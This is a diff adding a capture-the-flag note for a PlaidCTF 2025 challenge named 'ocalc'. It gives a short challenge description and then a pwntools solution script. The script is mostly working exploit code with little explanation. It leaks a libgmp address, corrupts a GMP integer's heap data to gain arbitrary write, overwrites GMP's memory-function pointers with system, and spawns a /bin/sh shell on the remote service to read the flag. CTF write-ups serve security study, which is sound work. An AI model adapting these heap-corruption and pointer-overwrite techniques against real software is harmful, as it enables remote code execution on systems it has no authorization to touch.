@@ -1,0 +1,90 @@
+* Description
+[[file:clipboard-20250406T134136.png]]
+
+You try to get the grit out of your eyes as you total up your bounty earnings. As you type in the
+last couple of numbers, your finger slips. The ~nc ocalc.chal.pwni.ng 1337~ blows up in your hands. 
+
+https://plaidctf.com/files/distribute.425c426edff57a33188a9da280e58cae1f98bfa9d7034343ea7d6d4dc90f2b0f.tgz
+
+
+* Solution
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+#
+# @mebeim - 2025-04-06
+#
+
+from pwn import *
+
+
+context(arch='amd64')
+libgmp = ELF('libgmp.so.10.5.0', checksec=False)
+
+if args.REMOTE:
+	r = remote('ocalc.chal.pwni.ng', 1337)
+else:
+	r = remote('localhost', 1337)
+
+input('?')
+
+for i in range(60):
+	r.sendlineafter(b'@ ', b'1 1 1 2 amax')
+r.sendlineafter(b'@ ', b'drop ' * 76)
+
+leak = int(r.recvline().split()[-1])
+log.success('Leak: 0x%x', leak)
+
+libgmp.address = leak + 0x202d30
+system = libgmp.address + 0xc5b7e
+assert libgmp.address & 0xfff == 0x000
+
+log.success('=> libgmp          @ 0x%x', libgmp.address)
+log.success('=> __gmp_free_func @ 0x%x', libgmp.sym.__gmp_free_func)
+log.success('=> system          @ 0x%x', system)
+
+r.sendlineafter(b'@ ', b'drop ' * 44)
+
+big = '0x' + '7000000000000000' * 3
+for i in range(113):
+	if i % 2 == 0:
+		r.sendlineafter(b'@ ', b'7 7 7 2 amax')
+	else:
+		r.sendlineafter(b'@ ', f'{big} 7 7 2 amax'.encode())
+
+# [1]->_mp_d now overlaps with [212]: set it up for arb r/w
+#     _mp_alloc = 3
+#     _mp_size = 3
+#     _mp_d = &__gmp_free_func
+
+chain = flat([
+	0, # leave __gmp_default_free as is
+	system - libgmp.sym.__gmp_default_reallocate,
+	0, # leave __gmp_default_allocate as is
+][::-1], endian='big')
+
+sz = len(chain) // 8
+fake_mpz = f'{libgmp.sym.__gmp_free_func:#x}{sz:08x}{sz:08x}'
+
+log.info('Writing fake mpz: %s', fake_mpz)
+r.sendlineafter(b'@ ', b'drop')
+r.sendlineafter(b'@ ', f'{fake_mpz} +'.encode())
+
+# input('check...')
+# r.interactive()
+
+log.info('Writing chain: %s', chain.hex())
+r.sendlineafter(b'@ ', b'drop ' * 211)
+r.sendlineafter(b'@ ', f'0x{chain.hex()} +'.encode())
+
+binsh = int.from_bytes(b'/bin/sh\0', 'little')
+bullshit = b'0x4141414141414141 0x424242424242442 '
+bullshit += b'0x3333333333333333 0x4444444444444444444444444444444444 '
+bullshit += f'{binsh:#x} 3 amax'.encode()
+
+# Trigger free
+r.sendlineafter(b'@ ', bullshit)
+r.sendline(b'cat flag\n' * 10)
+
+r.interactive()
+#+end_src
